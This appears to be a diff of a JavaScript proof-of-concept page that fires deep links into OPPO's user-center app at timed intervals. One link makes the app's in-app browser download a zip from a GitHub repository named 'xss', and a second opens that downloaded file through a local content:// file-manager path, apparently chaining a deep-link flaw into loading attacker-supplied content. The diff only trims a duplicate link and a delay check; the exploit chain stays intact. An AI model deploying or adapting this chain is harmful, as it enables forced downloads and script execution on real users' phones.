@@ -13,8 +13,7 @@
         const urls = [
             'https://www.youtube.com/watch?v=tf-HYnN0H4Y',
             'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip',
-            'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip',
-            'https://www.youtube.com/watch?v=tf-HYnN0H4Y'
+            'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip'
         ];
 
         const defaultDelay = 5000; // Default delay
@@ -24,8 +23,7 @@
             if (index < urls.length) {
                 let delay = defaultDelay;
 
-                if (urls[index] === 'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip' ||
-                    urls[index] === 'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip') {
+                if (urls[index] === 'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip') {
                     delay = specialDelay;
                 }
 
